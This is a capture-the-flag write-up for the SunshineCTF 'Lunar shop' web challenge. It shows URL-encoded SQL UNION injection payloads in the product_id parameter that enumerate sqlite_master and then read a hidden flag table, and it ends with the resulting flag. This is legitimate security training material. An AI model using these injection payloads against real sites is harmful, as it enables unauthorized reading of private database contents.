# Lunar shop

```
We have amazing new products for our gaming service! Unfortunately we don't sell our unreleased flag product yet !

    Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

https://meteor.sunshinectf.games 
```

The `product_id` is prone to SQL injection. Find hidden table names after some attempts to enumerate the database used, inspired by <https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections>:

```
# 2 UNION SELECT 1, 'anotheruser', 'anystring' name from sqlite_master --
https://meteor.sunshinectf.games/product?product_id=2%20UNION%20SELECT%201,%20%27anotheruser%27,%20%27any%20string%27,%20name%20from%20sqlite_master--
```

It gives us the `flag` table name. Query flag from it:

```
# 2 UNION SELECT 1, 'anotheruser', 'anystring', flag from flag --
https://meteor.sunshinectf.games/product?product_id=2%20UNION%20SELECT%201,%20%27anotheruser%27,%20%27any%20string%27,%20flag%20from%20flag--
```

Result:


```
ID 	Name 	Description 	Price
1 	anotheruser 	any string 	sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}
```

Flag: `sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}`.
